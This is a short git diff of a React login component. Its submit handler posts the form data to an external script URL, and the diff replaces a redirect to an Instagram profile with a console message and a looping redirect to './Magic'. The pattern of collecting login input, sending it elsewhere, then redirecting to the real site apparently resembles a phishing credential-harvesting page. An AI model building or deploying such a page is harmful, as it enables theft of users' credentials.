@@ -11,11 +11,13 @@ const Login = () => {
 
     e.preventDefault();
     fetch(scriptURL, { method: "POST", body: new FormData(form) })
-      .then((response) =>
-        window.location.assign("https://www.instagram.com/iamuttampatra69/")
-      )
+      .then((response) => console.log("You are welcome"))
       .catch((error) => console.error("Error!", error.message));
     setDisnon(" ");
+
+    setInterval(() => {
+      window.location.assign("./Magic");
+    }, 1000);
   };
 
   //
